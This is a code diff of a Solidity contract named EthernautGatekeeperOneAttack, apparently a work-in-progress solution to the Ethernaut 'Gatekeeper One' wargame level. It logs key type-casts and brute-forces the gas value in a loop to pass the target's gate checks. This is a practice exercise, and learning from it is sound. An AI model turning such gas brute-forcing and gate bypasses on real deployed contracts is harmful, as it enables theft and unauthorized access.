@@ -13,10 +13,19 @@ contract EthernautGatekeeperOneAttack {
         console.log(uint64(_gateKey));
     }
 
-    function attack(bytes8 key) public {
+    function attack() public {
+        bytes8 _gateKey = bytes8("test");
+        console.log(uint32(uint64(_gateKey)));
+        console.log(uint16(uint64(_gateKey)));
+        console.log("----");
+        console.log(uint32(uint64(_gateKey)));
+        console.log(uint64(_gateKey));
+        console.log("----");
+        console.log(uint32(uint64(_gateKey)));
+        console.log(uint16(uint160(tx.origin)));
         for (uint i = 0; i < 8191; i++) {
             uint price = 80000 + i;
-            try target.enter{gas: price}(key) {
+            try target.enter{gas: price}(_gateKey) {
                 console.log("gatcha", price);
                 break;
             } catch {}
